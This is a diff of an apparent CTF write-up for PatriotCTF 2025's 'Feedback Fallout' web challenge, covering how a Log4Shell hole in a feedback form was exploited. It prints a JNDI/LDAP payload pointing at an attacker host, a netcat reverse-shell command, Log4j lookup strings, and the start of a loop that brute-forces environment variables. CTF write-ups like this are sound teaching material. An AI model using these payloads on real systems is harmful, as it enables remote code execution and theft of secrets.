@@ -171,9 +171,12 @@
     <h1>Feedback Fallout</h1>
     <div class="meta">PatriotCTF 2025 • <span>Web</span> • syndro</div>
 
-    <h2>1. The Feedback Form</h2>
-    <p>The moment we enter the site, we see a simple feedback text area.</p>
-    <img src="https://github.com/user-attachments/assets/81a61722-71a8-417f-8c3d-4f0635109c69" alt="Challenge banner">
+    <h2>0. The challenge description</h2>
+    <p>The challenge description is interesting. It mentions an old Java version, which could be an old exploit.</p>
+    <img src="https://github.com/user-attachments/assets/81a61722-71a8-417f-8c3d-4f0635109c69" alt="Challenge Description">
+
+    <h2>1. The Feedback page.</h2>
+    <p>The moment I entered the page, there was nothing other than a simple feedback Textarea.</p>
     <img src="https://github.com/user-attachments/assets/b8d412d8-1c01-42d0-bc05-eff148bf4d22" alt="Feedback form">
 
     <p>I inspected the source and Network tab → nothing useful.</p>
@@ -181,14 +184,26 @@
     <h2>2. Discovering the Vulnerability</h2>
     <p>Intercepted the POST request with ZAP and saw our feedback being logged directly on the server response:</p>
     <img src="https://github.com/user-attachments/assets/ceb22927-44ac-4f77-9621-cc402f2cd663" alt="ZAP intercept">
-    <img src="https://github.com/user-attachments/assets/6de0d39c-c4c4-4ba6-bd6a-4359cd074ec5" alt="Logged feedback">
-
-    <p>That scream Log4Shell (CVE-2021-44228). Tested with the classic payload:</p>
+    <p>So I started googling about Logs exploit, and then I remembered, <code>"Logs four"</code> at the bottom of the feedback page, which could lead to something.</p>
+    <img src="https://github.com/user-attachments/assets/6de0d39c-c4c4-4ba6-bd6a-4359cd074ec5" alt="Challenge hint!">
+    <p>I came across an old Java vulnerability, <code>Log4Shell (CVE-2021-44228)</code></p>
+    <p>I Tried to get a reverse shell using <code>Marshalsec</code></p>
+    <pre><code>
+      How MarshalSec works:
+      1 - You have a netcat listener on your Attacker Machine
+      2 - You set up a SimpleHTTPServer on your Attacker Machine, usually done with Python.
+      3 - You set up an LDAP server using Marshalsec 
+      4 - You host an old-version Java .class which executes any command u want, for a reverse shell for our NC "nc -e /bin/bash OUR-IP OUR-NC-PORT"
+      5 - You send a JNDI/ldap to access that Exploit.class on your Attacker Machine.
+      6 - Final Payload : ${jndi:ldap//YOUR-IP:1389/Exploit.class}
+    </code></pre>
+    <p>But, whatever I did, I could never get a reverse shell using <code>JNDI</code>. Perhaps it's disabled in that version.</p>
+    <p>So, I tried a Basic syntax</p>
     <pre><code>${java:version}</code></pre>
 
     <img src="https://github.com/user-attachments/assets/47f8d08b-e228-49f0-af15-cb69412853b8" alt="Java version leaked">
 
-    <p>Confirmed — it’s vulnerable! JNDI reverse shells didn’t work (probably disabled), so I switched to environment variable enumeration.</p>
+    <p>So, Since <code>JNDI</code> Is disabled, AND the java still leaks info, What if i just bruteforce <code>${env:KEY}</code></p>
 
     <pre><code>Common syntaxes:
 - ${sys:os.name}
@@ -198,7 +213,7 @@
 - ${env:HOSTNAME}
 - ${java:version}</code></pre>
 
-    <h2>3. The Flag Hunt</h2>
+    <h2>3. The Exploit</h2>
     <p>Threw together a quick for-loop to brute-force common env variable names containing the flag:</p>
 
     <pre><code>for i in Admin admin ADMIN user USER User Owner Root root PCTF pctf MASONC masonc Pctf pCTF FLAG FLAG_CTF CTF SECRET FLAG KEY SECRET_FLAG FLAGS FLAGO flag secret secret_flag FLAG_SECRET secret_flag FLAG_SECRET secret_FLAG FLAG_SECRET; do 
